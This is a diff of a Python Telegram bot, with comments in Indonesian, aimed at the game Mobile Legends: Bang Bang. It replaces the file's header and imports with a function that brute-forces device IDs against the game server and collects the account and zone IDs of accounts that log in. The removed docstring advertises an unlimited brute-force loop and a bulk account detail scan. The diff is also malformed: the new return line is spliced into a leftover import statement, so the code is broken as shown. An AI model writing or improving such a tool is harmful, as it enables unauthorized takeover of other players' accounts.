@@ -1,40 +1,39 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-MLBB COMBINED BOT — Telegram Version (FINAL)
-Fitur:
-  🚀 BF Device Loop (max 10 device, unlimited loop)
-  📦 Bulk Detail Scan (akurat: skin, hero, level, rank)
-  📡 Status (ping, jitter, uptime)
-  📢 Broadcast (khusus owner)
-  🌐 Public access (wajib join channel)
-"""
+# ══════════════════════════════════════════════════════════════════════
+# BF DEVICE LOOP — UPDATED (mengikuti jgnganti.py)
+# ══════════════════════════════════════════════════════════════════════
+def bf_login_with_device(device_id, device_model=None):
+    """
+    Brute force Device ID ke game server MLBB.
+    Sukses jika berhasil connect & login ke game server.
+    """
+    result = {
+        "status": "fail",
+        "device_id": device_id,
+        "info": None,
+        "error": None,
+    }
+    try:
+        with GameConnection(device_id=device_id, device_model=device_model) as conn:
+            # Coba masuk ke game server
+            if not conn.connect_to_game_server():
+                result["error"] = "GAME_CONNECT_FAILED"
+                return result
 
-import os
-import sys
-import time
-import socket
-import struct
-import zlib
-import random
-import logging
-import datetime
-import threading
-import asyncio
-import re
-import json
-from enum import Enum
-from typing import Any, Tuple
-from concurrent.futures import ThreadPoolExecutor, as_completed
+            # Jika berhasil connect ke game server, artinya device ID valid
+            result["status"] = "success"
+            result["info"] = {
+                "account_id": conn.account_id,
+                "zone_id": conn.zone_id,
+            }
 
-import urllib3
-import zstandard as zstd
-from Crypto.Cipher import AES
+    except ConnectionError as e:
+        result["error"] = f"CONN_ERROR: {e}"
+    except socket.timeout:
+        result["error"] = "SOCKET_TIMEOUT"
+    except Exception as e:
+        result["error"] = f"{type(e).__name__}: {e}"
 
-import telegram
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, CommandHandler, CallbackQueryHandler,
+    return result    Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes, ConversationHandler
 )
 from telegram.error import Conflict, InvalidToken
